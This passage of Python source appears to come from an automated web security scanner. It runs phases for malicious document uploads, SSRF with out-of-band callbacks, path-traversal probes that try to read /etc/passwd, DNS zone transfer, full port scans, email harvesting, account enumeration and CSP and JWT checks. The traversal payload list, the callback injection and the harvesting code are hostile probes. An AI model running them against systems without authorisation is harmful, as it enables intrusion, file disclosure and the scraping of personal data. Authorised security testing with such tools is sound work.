                                "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                "pdf": "application/pdf",
                                "xml": "application/xml",
                                "svg": "image/svg+xml",
                                "html": "text/html",
                            }
                            ctype = content_map.get(fmt, "application/octet-stream")
                            post_req = urllib.request.Request(url,
                                data=payload.encode("utf-8"),
                                method="POST",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": ctype,
                                    "Content-Disposition": f'attachment; filename="exploit.{fmt}"',
                                    **_d_extra_headers,
                                })
                            ps, pheaders, pbody = await _async_urlopen(_d_urlopen, post_req, timeout=10)
                            pbody_str = pbody.decode("utf-8", errors="ignore")
                            if ps in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {ps} "
                                    f"(document upload accepted)"
                                )
                            if "error" in pbody_str.lower() and any(
                                kw in pbody_str.lower() for kw in ["parse", "invalid", "malformed", "unexpected"]
                            ):
                                findings.append(
                                    f"[doc-attack-parser-error] {url} — format={fmt} — parser error in response"
                                )
                        except urllib.error.HTTPError as e:
                            if e.code in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {e.code} "
                                    f"(document upload accepted)"
                                )
                        except Exception:
                            continue
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[doc-attack] No document-based attack vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"63-DOC-ATTACK: {len(findings)} document attack findings → {out}")
    return {"63-DOC-ATTACK": str(out), "count": len(findings)}


# ────────────────── Phase 64-IDEMPOTENCY: Idempotency Key Replay ──────────────
_IDEMPOTENCY_HEADERS = ["Idempotency-Key", "X-Idempotency-Key", "X-Request-Id", "Idempotency-Key", "X-Idempotency-Request", "Request-Id"]


async def phase_64_IDEMPOTENCY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"64-IDEMPOTENCY"}:
        return {}
    _out = outdir / "idempotency.txt"
    if _out.exists() and not force:
        return {"64-IDEMPOTENCY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 64-IDEMPOTENCY: idempotency key replay testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()

    # Collect POST endpoints from harvested URLs
    api_endpoints: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            parsed = urllib.parse.urlparse(u)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if any(m in base.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rest/", "/payment", "/transfer", "/order", "/checkout")):
                api_endpoints.add(base)

    if not api_endpoints:
        fuzz_file = outdir / "fuzz.txt"
        if fuzz_file.exists():
            for ln in read_lines(fuzz_file):
                parts = ln.split("\t") if "\t" in ln else ln.split()
                for p in parts:
                    if p.startswith("http") and any(m in p.lower() for m in ("/api/", "/v1/", "/v2/")):
                        api_endpoints.add(p.split("?")[0])

    targets = list(api_endpoints)[:10]
    if not targets:
        findings.append("[idempotency] No API endpoints found for replay testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
        return {"64-IDEMPOTENCY": str(out), "count": len(findings)}

    for endpoint in targets:
        for header_name in _IDEMPOTENCY_HEADERS:
            key = f"reconchain-replay-{hashlib.md5(endpoint.encode()).hexdigest()[:8]}"
            test_body = json.dumps({"test": True, "ts": str(datetime.now())}).encode()
            try:
                req1 = urllib.request.Request(endpoint, data=test_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s1, h1, b1 = await _async_urlopen(_id_urlopen, req1, timeout=10)
                b1_text = b1.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s1, b1_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            modified_body = json.dumps({"test": True, "ts": str(datetime.now()), "modified": True}).encode()
            try:
                req2 = urllib.request.Request(endpoint, data=modified_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s2, h2, b2 = await _async_urlopen(_id_urlopen, req2, timeout=10)
                b2_text = b2.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s2, b2_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            if s1 in (200, 201, 202) and s2 in (200, 201, 202):
                if b1_text != b2_text or s1 != s2:
                    findings.append(
                        f"[idempotency-violation] {endpoint} — header={header_name} key={key} "
                        f"— replay with different body returned different response "
                        f"(req1: HTTP {s1}, req2: HTTP {s2})"
                    )
                else:
                    findings.append(
                        f"[idempotency-compliant] {endpoint} — header={header_name} — "
                        f"replay returned identical response (HTTP {s1})"
                    )
            elif s1 != s2:
                findings.append(
                    f"[idempotency-different-status] {endpoint} — header={header_name} — "
                    f"first=HTTP {s1}, second=HTTP {s2} (possible non-idempotent)"
                )

    if not findings:
        findings.append("[idempotency] No idempotency-key endpoints detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
    return {"64-IDEMPOTENCY": str(out), "count": len(findings)}


# ────────────────── Phase 65-SESSION: session token analysis ────────────────
_SESSION_HEADERS_TO_CHECK = [
    ("HttpOnly", "httpOnly"),
    ("Secure", "secure"),
    ("SameSite", "samesite"),
    ("Path", "path"),
    ("Domain", "domain"),
    ("Max-Age", "max-age"),
    ("Expires", "expires"),
]

async def phase_65_SESSION(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"65-SESSION"}:
        return {}
    _out = outdir / "session_analysis.txt"
    if _out.exists() and not force:
        return {"65-SESSION": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 65-SESSION: session token analysis")
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _s_extra = _extra_headers_dict()

    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_ssl]
    for host in targets:
        await _throttle_rate()
        try:
            req = urllib.request.Request(host, method="GET", headers={"User-Agent": "Mozilla/5.0", **_s_extra})
            status, headers, body_bytes = await _async_urlopen(_s_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue

        set_cookie = headers.get_all("Set-Cookie") if hasattr(headers, "get_all") else [headers.get("Set-Cookie", "")]
        for cookie_str in set_cookie:
            if not cookie_str:
                continue
            cookie_name = cookie_str.split("=", 1)[0].strip() if "=" in cookie_str else cookie_str[:30]
            findings.append(f"[cookie] {host} → Set-Cookie: {cookie_name}={cookie_str[len(cookie_name)+1:][:80]}…")
            for attr_name, attr_lower in _SESSION_HEADERS_TO_CHECK:
                if attr_lower not in cookie_str.lower():
                    findings.append(f"[cookie-missing-{attr_name}] {cookie_name} lacks {attr_name} flag ({host})")

        for m in re.finditer(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', body):
            jwt_raw = m.group()
            try:
                parts = jwt_raw.split(".")
                header_b64 = parts[0] + "=="
                payload_b64 = parts[1] + "=="
                header_decoded = json.loads(base64.b64decode(header_b64).decode("utf-8", errors="ignore"))
                payload_decoded = json.loads(base64.b64decode(payload_b64).decode("utf-8", errors="ignore"))
                alg = header_decoded.get("alg", "unknown")
                exp = payload_decoded.get("exp", 0)
                iat = payload_decoded.get("iat", 0)
                findings.append(f"[jwt-found] {host} → alg={alg} exp={exp} iat={iat}")
                if alg == "none":
                    findings.append(f"[jwt-none-alg] {host} → JWT uses 'none' algorithm (vulnerable)")
                if not payload_decoded.get("exp"):
                    findings.append(f"[jwt-no-exp] {host} → JWT has no expiration")
            except Exception:
                findings.append(f"[jwt-raw] {host} → {jwt_raw[:60]}… (unparseable)")

        if "session" in body.lower() or "token" in body.lower():
            for m in re.finditer(r'[\"\'][A-Za-z0-9+/=]{20,}[\"\']', body):
                val = m.group().strip("\"'")
                freq = {}
                for c in val:
                    freq[c] = freq.get(c, 0) + 1
                entropy = 0.0
                for f in freq.values():
                    p = f / len(val)
                    entropy -= p * math.log2(p)
                if entropy > 4.5 and len(val) >= 20:
                    findings.append(f"[high-entropy-token] {host} → {val[:40]}… (entropy={entropy:.2f})")

    if not findings:
        findings.append("[session] No session tokens or cookies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"65-SESSION: {len(findings)} findings → {out}")
    return {"65-SESSION": str(out), "count": len(findings)}


# ────────────────── Phase 66-SSRF-FULL: SSRF with OOB callbacks ─────────────
async def phase_66_SSRF_FULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any],
    oast_domain: str = "", force: bool = False,
) -> Dict[str, Any]:
    if skip & {"66-SSRF-FULL"}:
        return {}
    _out = outdir / "ssrf_full.txt"
    if _out.exists() and not force:
        return {"66-SSRF-FULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 66-SSRF-FULL: SSRF with OOB callback testing")
    findings: List[str] = []
    _sf_urlopen = _get_urlopener()
    _sf_extra = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        findings.append("[ssrf-full] No URLs available for testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"66-SSRF-FULL": str(_out), "count": len(findings)}

    callback = oast_domain or ""
    if not callback:
        findings.append("[ssrf-full] No OAST callback domain available (use --oast-domain)")
    else:
        urls = read_lines(urls_file)[:_PIPELINE_CFG.sample_urls_fuzz]
        ssrf_params = ["url", "uri", "file", "path", "dest", "redirect", "return",
                       "next", "img", "image", "load", "read", "document", "page",
                       "folder", "root", "host", "domain", "show", "view", "dir",
                       "location", "target", "to", "out", "data", "reference", "site"]
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_params:
                    new_qs = []
                    for k, vals in qs.items():
                        for v in vals:
                            if k == param:
                                new_qs.append((k, f"http://{callback}/ssrf/{param}"))
                            else:
                                new_qs.append((k, v))
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urllib.parse.urlencode(new_qs), parsed.fragment,
                    ))
                    try:
                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_sf_extra})
                        status, _, _ = await _async_urlopen(_sf_urlopen, req, timeout=10)
                        if status in (200, 301, 302):
                            findings.append(f"[ssrf-oob-tested] {test_url} → HTTP {status} (check OAST for callback)")
                    except Exception as e:
                        if "timeout" not in str(e).lower():
                            findings.append(f"[ssrf-oob-error] {test_url} → {e}")

    if not findings:
        findings.append("[ssrf-full] No SSRF parameters found or tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"66-SSRF-FULL: {len(findings)} findings → {out}")
    return {"66-SSRF-FULL": str(_out), "count": len(findings)}


# ────────────────── Phase 67-PATHNORM: path normalization ──────────────────
_PATH_TRAVERSAL_PAYLOADS = [
    "/..;/", "/../", "/%2e%2e/", "/%2e%2e%2f", "/..%252f", "/..%c0%ae/",
    "/.%00/", "/....//....//", "/..\\", "//", "/%5c..%5c", "/..%5c",
    "/..%252f..%252f", "/%c0%ae%c0%ae/", "/%252e%252e%252f",
]

async def phase_67_PATHNORM(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"67-PATHNORM"}:
        return {}
    _out = outdir / "path_normalization.txt"
    if _out.exists() and not force:
        return {"67-PATHNORM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 67-PATHNORM: path normalization / traversal")
    findings: List[str] = []
    _pn_urlopen = _get_urlopener()
    _pn_extra = _extra_headers_dict()
    targets = [h for h in (read_lines(outdir / "host_targets.txt") if (outdir / "host_targets.txt").exists() else read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else [])][:_PIPELINE_CFG.sample_hosts_ssl]

    if not targets:
        findings.append("[pathnorm] No targets available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"67-PATHNORM": str(_out), "count": len(findings)}

    for host in targets:
        base = host.rstrip("/")
        for payload in _PATH_TRAVERSAL_PAYLOADS:
            await _throttle_rate()
            path = payload.lstrip("/")
            test_url = f"{base}/{path}etc/passwd"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_pn_extra})
                status, headers, body = await _async_urlopen(_pn_urlopen, req, timeout=8)
                body_text = body.decode("utf-8", errors="ignore").lower()
                if status == 200 and ("root:" in body_text or "daemon:" in body_text or "bin:" in body_text or "nobody:" in body_text):
                    findings.append(f"[pathnorm-lfi] {test_url} → HTTP 200 (LFI via {payload})")
                elif status == 200 and body_text.strip():
                    findings.append(f"[pathnorm-diff] {test_url} → HTTP 200 ({len(body_text)}b, check manually)")
                elif status not in (404, 400):
                    findings.append(f"[pathnorm-status] {test_url} → HTTP {status}")
            except Exception:
                pass

    if not findings:
        findings.append("[pathnorm] No path normalization issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"67-PATHNORM: {len(findings)} findings → {out}")
    return {"67-PATHNORM": str(_out), "count": len(findings)}


# ────────────────── Phase 68-DEPCVE: dependency CVE scanning ──────────────
async def phase_68_DEPCVE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"68-DEPCVE"}:
        return {}
    _out = outdir / "dep_cve.txt"
    if _out.exists() and not force:
        return {"68-DEPCVE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 68-DEPCVE: dependency CVE scanning")
    findings: List[str] = []
    js_urls = outdir / "urls_js.txt"
    urls_all = outdir / "urls_all.txt"

    deps_found: Dict[str, str] = {}
    for src in [js_urls, urls_all]:
        if not src.exists():
            continue
        for u in read_lines(src):
            if not u.strip():
                continue
            path = u.split("?")[0].split("#")[0].lower()
            parts = path.rstrip("/").split("/")
            for i, p in enumerate(parts):
                if p in ("node_modules", "vendor", "lib", "components", "bower_components") and i + 1 < len(parts):
                    pkg = parts[i + 1]
                    if pkg.startswith("@") and i + 2 < len(parts):
                        pkg = f"{pkg}/{parts[i + 2]}"
                        ver_offset = i + 3
                    else:
                        ver_offset = i + 2
                    ver = ""
                    if ver_offset < len(parts) and parts[ver_offset].startswith(("@", "v")):
                        ver = parts[ver_offset]
                    elif ver_offset < len(parts):
                        ver = parts[ver_offset]
                    if pkg and pkg not in deps_found:
                        deps_found[pkg] = ver
            # Check for version strings in filename
            m = re.search(r'[./]([^./]+)[.-](\d+\.\d+\.\d+)[./]', path)
            if m:
                pkg = m.group(1)
                ver = m.group(2)
                if pkg and pkg not in deps_found:
                    deps_found[pkg] = ver

    known_vulns = {
        "jquery": (">=3.0.0", "CVE-2020-11023 (XSS) fixed in 3.5.0"),
        "lodash": (">=4.17.21", "CVE-2021-23337 (ReDoS) fixed in 4.17.21"),
        "moment": (">=2.29.4", "CVE-2022-24785 (ReDoS) fixed in 2.29.4"),
        "express": (">=4.18.2", "CVE-2022-24999 (qs) fixed in 4.18.0"),
        "underscore": (">=1.13.3", "CVE-2021-23358 (ReDoS) fixed in 1.13.1"),
        "axios": (">=1.6.0", "CVE-2023-45857 (SSRF) fixed in 1.6.0"),
    }

    def _parse_version(v: str):
        parts = []
        for p in v.replace("-", ".").replace("_", ".").split("."):
            try:
                parts.append(int(p))
            except ValueError:
                break
        return tuple(parts)

    for pkg, ver in deps_found.items():
        pkg_lower = pkg.lower()
        for vuln_pkg, (safe_ver, info) in known_vulns.items():
            if vuln_pkg in pkg_lower:
                if ver:
                    detected_tuple = _parse_version(ver)
                    safe_tuple = _parse_version(safe_ver.lstrip(">=v"))
                    if detected_tuple and safe_tuple and detected_tuple >= safe_tuple:
                        continue
                    findings.append(f"[dep-cve] {pkg}@{ver} — {info}")
                else:
                    findings.append(f"[dep-cve] {pkg} (version unknown) — {info}")

    if not deps_found:
        findings.append("[dep-cve] No dependencies detected for CVE scanning")

    if not findings:
        findings.append("[dep-cve] Dependencies scanned — no known CVEs found")

    # Try trivy if available
    if t.has("trivy") and (outdir / "urls_all.txt").exists():
        tmp_dir = outdir / ".trivy_scan"
        tmp_dir.mkdir(parents=True, exist_ok=True)
        pkg_json = tmp_dir / "package.json"
        pkg_json.write_text(json.dumps({"name": "scan", "dependencies": deps_found}))
        trivy_out = outdir / "logs" / "trivy_output.txt"
        await _run("trivy-check", ["trivy", "fs", "--quiet", "--format", "json", "--output", str(trivy_out), str(tmp_dir)], 120, outdir)
        if trivy_out.exists() and read_lines(trivy_out):
            findings.append(f"[trivy-results] {trivy_out}")
        for p in tmp_dir.glob("*"):
            p.unlink(missing_ok=True)
        tmp_dir.rmdir()

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"68-DEPCVE: {len(findings)} findings → {out}")
    return {"68-DEPCVE": str(_out), "count": len(findings)}


# ────────────────── Phase 69-DNSZT: DNS zone transfer ────────────────────

async def phase_69_DNSZT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"69-DNSZT"}:
        return {}
    _out = outdir / "dns_zone_transfer.txt"
    if _out.exists() and not force:
        return {"69-DNSZT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 69-DNSZT: DNS zone transfer")
    findings: List[str] = []

    async def _get_nameservers() -> List[str]:
        ns: List[str] = []
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["dig", "+short", "NS", domain])
                if rc == 0:
                    ns = [ln.decode().strip().rstrip(".") for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        if not ns:
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["nslookup", "-type=NS", domain])
                if rc == 0:
                    for ln in stdout.decode(errors="ignore").splitlines():
                        m = re.search(r'nameserver\s*=\s*(\S+)', ln, re.IGNORECASE)
                        if m:
                            ns.append(m.group(1).rstrip("."))
            except Exception:
                pass
        return ns

    nameservers = await _get_nameservers()
    if not nameservers:
        findings.append("[dns-zt] No nameservers found for domain")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"69-DNSZT": str(_out), "count": len(findings)}

    for ns in nameservers:
        if t.has("dig"):
            try:
                rc, stdout, stderr = await _run_cmd_clear_proxy(["dig", "@" + ns, domain, "AXFR"], timeout=15)
                output = stdout.decode(errors="ignore")
                err_text = stderr.decode(errors="ignore")
                if "Transfer failed" in err_text or "refused" in err_text.lower() or "timed out" in err_text.lower():
                    findings.append(f"[dns-zt-secure] {ns} — zone transfer refused (secure)")
                elif any(ln.strip() and "IN" in ln for ln in output.splitlines() if "SOA" in ln or "NS" in ln or "A" in ln):
                    n_records = len([ln for ln in output.splitlines() if ln.strip()])
                    findings.append(f"[dns-zt-vulnerable] {ns} — zone transfer SUCCEEDED ({n_records} records)")
                    for ln in output.splitlines()[:20]:
                        findings.append(f"  {ln.strip()}")
                    if n_records > 20:
                        findings.append(f"  … and {n_records - 20} more records")
                else:
                    findings.append(f"[dns-zt-checked] {ns} — no zone data returned")
            except asyncio.TimeoutError:
                findings.append(f"[dns-zt-timeout] {ns} — zone transfer timed out")
            except Exception as e:
                findings.append(f"[dns-zt-error] {ns} — {e}")

    if not findings:
        findings.append("[dns-zt] No zone transfer tests completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"69-DNSZT: {len(findings)} findings → {out}")
    return {"69-DNSZT": str(_out), "count": len(findings)}


# ────────────────── Phase 70-PORTFULL: full port scan on top target ──────
async def phase_70_PORTFULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"70-PORTFULL"}:
        return {}
    _out = outdir / "ports_full.txt"
    if _out.exists() and not force:
        return {"70-PORTFULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 70-PORTFULL: full port scan (-p-) on top target")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        findings.append("[portfull] No hosts available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"70-PORTFULL": str(_out), "count": len(findings)}

    top_hosts = [h.split("://")[-1].split("/")[0].split(":")[0] for h in read_lines(hosts_file)][:3]
    for host in top_hosts:
        port_out: Optional[Path] = None
        try:
            if t.has("nmap"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                await _run(
                    f"nmap-full-{_safe_name(host)[:16]}",
                    ["nmap", "-Pn", "-p-", "--open", "-T4", "--min-rate", "500", "-oG", str(port_out), host],
                    3600, outdir,
                )
                if port_out.exists():
                    port_lines = read_lines(port_out)
                    open_ports = [ln for ln in port_lines if "/open/" in ln]
                    if open_ports:
                        for ln in open_ports:
                            findings.append(f"[portfull-found] {host} → {ln.strip()}")
                    else:
                        findings.append(f"[portfull-clean] {host} — no open ports beyond top-1000")
            elif t.has("naabu"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                await _run(
                    f"naabu-full-{_safe_name(host)[:16]}",
                    ["naabu", "-silent", "-host", host, "-p", "-", "-o", str(port_out)],
                    3600, outdir,
                )
                if port_out.exists() and read_lines(port_out):
                    for ln in read_lines(port_out):
                        findings.append(f"[portfull-found] {ln.strip()}")
                else:
                    findings.append(f"[portfull-clean] {host} — no additional ports found")
        finally:
            if port_out and port_out.exists():
                port_out.unlink(missing_ok=True)

    if not findings:
        findings.append("[portfull] No full port scan performed (nmap/naabu required)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"70-PORTFULL: {len(findings)} findings → {out}")
    return {"70-PORTFULL": str(_out), "count": len(findings)}


# ────────────────── Phase 71-EMHARVEST: email harvesting ─────────────────
_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

async def phase_71_EMHARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"71-EMHARVEST"}:
        return {}
    _out = outdir / "emails_harvested.txt"
    if _out.exists() and not force:
        return {"71-EMHARVEST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 71-EMHARVEST: email harvesting from URLs content")
    findings: List[str] = []
    _eh_urlopen = _get_urlopener()
    _eh_extra = _extra_headers_dict()
    seen_emails: Set[str] = set()

    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists():
        findings.append("[emails] No URLs to scan")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"71-EMHARVEST": str(_out), "count": len(findings)}

    urls = read_lines(urls_file)[:100]
    for url in urls:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_eh_extra})
            _, _, body_bytes = await _async_urlopen(_eh_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        for m in _EMAIL_RE.finditer(body):
            email = m.group().lower()
            if email not in seen_emails:
                seen_emails.add(email)
                findings.append(f"[email] {email} ({url})")

    if not findings:
        findings.append("[emails] No email addresses found in scanned content")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"71-EMHARVEST: {len(findings)} findings → {out}")
    return {"71-EMHARVEST": str(_out), "count": len(findings)}


# ───────────────────── Phase 72-ACCOUNTENUM: account enumeration ─────────────────────
async def phase_72_ACCOUNTENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"72-ACCOUNTENUM"}:
        return {}
    _out = outdir / "account_enum.txt"
    if _out.exists() and not force:
        return {"72-ACCOUNTENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 72-ACCOUNTENUM: account enumeration detection")
    findings: List[str] = []
    _ae_urlopen = _get_urlopener()
    _ae_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "72-ACCOUNTENUM: no host targets; skipping")
        return {"72-ACCOUNTENUM": str(_out), "count": 0}
    enum_paths = [
        ("/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/login", "POST", {"email": "nonexistent_user_12345@test.com", "password": "wrongpass"}),
        ("/api/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/signup", "POST", {"email": "existing_test@example.com"}),
        ("/register", "POST", {"email": "existing_test@example.com"}),
        ("/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/forgot-password", "POST", {"username": "nonexistent_user_12345"}),
        ("/api/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/reset-password", "POST", {"token": "invalid_token_12345"}),
        ("/api/reset-password", "POST", {"token": "invalid_token_12345"}),
    ]
    _ae_sem = asyncio.Semaphore(10)
    for host in read_lines(targets_file)[:10]:
        base = host if host.startswith("http") else f"https://{host}"
        for path, method, body in enum_paths:
            async with _ae_sem:
                await _throttle_rate()
                try:
                    url = f"{base.rstrip('/')}{path}"
                    data = urllib.parse.urlencode(body).encode() if body else b""
                    req = urllib.request.Request(url, data=data or None, method=method,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", **_ae_headers})
                    status, headers, body_bytes = await _async_urlopen(_ae_urlopen, req, timeout=10)
                    resp_body = body_bytes.decode("utf-8", errors="ignore").lower()
                    resp_len = len(resp_body)
                    resp_time = headers.get("X-Response-Time", "")
                    findings.append(f"[probed] {method} {url} → HTTP {status} len={resp_len} time={resp_time}")
                except urllib.error.HTTPError as e:
                    findings.append(f"[probed] {method} {url} → HTTP {e.code} (expected)")
                except Exception as e:
                    findings.append(f"[error] {method} {url} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"72-ACCOUNTENUM: {len(findings)} probes → {out}")
    return {"72-ACCOUNTENUM": str(_out), "count": len(findings)}


# ───────────────────── Phase 73-CSPBYPASS: CSP analysis ─────────────────────
async def phase_73_CSPBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"73-CSPBYPASS"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"73-CSPBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 73-CSPBYPASS: CSP header analysis + bypass detection")
    findings: List[str] = []
    _csp_urlopen = _get_urlopener()
    _csp_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "73-CSPBYPASS: no targets; skipping")
        return {"73-CSPBYPASS": str(_out), "count": 0}
    csp_danger_directives = {
        "unsafe-inline": "script-src/style-src allows 'unsafe-inline' — XSS protection degraded",
        "unsafe-eval": "script-src allows 'unsafe-eval' — eval() XSS possible",
        "http://": "script-src allows http:// — MITM possible over HTTP",
        "*.": "wildcard in script-src — can load from any subdomain",
        "*": "wildcard source — entire CSP bypassable",
    }
    csp_known_bypass_domains = {
        "cdnjs.cloudflare.com", "ajax.googleapis.com", "cdn.jsdelivr.net",
        "cdn.socket.io", "code.jquery.com", "maxcdn.bootstrapcdn.com",
        "cdn.rawgit.com", "cdn.jsdelivr.net", "unpkg.com", "www.google-analytics.com",
        "googletagmanager.com", "googleapis.com", "gstatic.com", "youtube.com",
        "platform.twitter.com", "www.youtube.com", "apis.google.com",
        "ajax.aspnetcdn.com", "ajax.microsoft.com",
    }
    _csp_sem = asyncio.Semaphore(10)
    checked_hosts: Set[str] = set()
    for host in read_lines(targets_file)[:20]:
        base = host if host.startswith("http") else f"https://{host}"
        hostname = base.split("/")[2].split(":")[0] if "://" in base else base
        if hostname in checked_hosts:
            continue
        checked_hosts.add(hostname)
        async with _csp_sem:
            await _throttle_rate()
            try:
                req = urllib.request.Request(base, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_csp_headers})
                status, headers, body_bytes = await _async_urlopen(_csp_urlopen, req, timeout=10)
                csp = None
                for hdr_name in ("content-security-policy", "content-security-policy-report-only"):
                    val = headers.get(hdr_name, "")
                    if val:
                        csp = {"header": hdr_name, "value": val}
                        break
                if not csp:
                    findings.append(f"[no-csp] {base} — no CSP header (clickjacking/XSS risk)")
                    continue
                findings.append(f"[csp] {base} → {csp['header']}: {csp['value'][:200]}")
                val_lower = csp["value"].lower()
                for pattern, desc in csp_danger_directives.items():
                    if pattern in val_lower:
                        findings.append(f"  [warn] {desc}")
                if "script-src" in val_lower:
                    for dom in csp_known_bypass_domains:
                        if dom in val_lower:
                            findings.append(f"  [bypass] script-src whitelists {dom} — known JSONP/Angular bypass")
                directives = {}
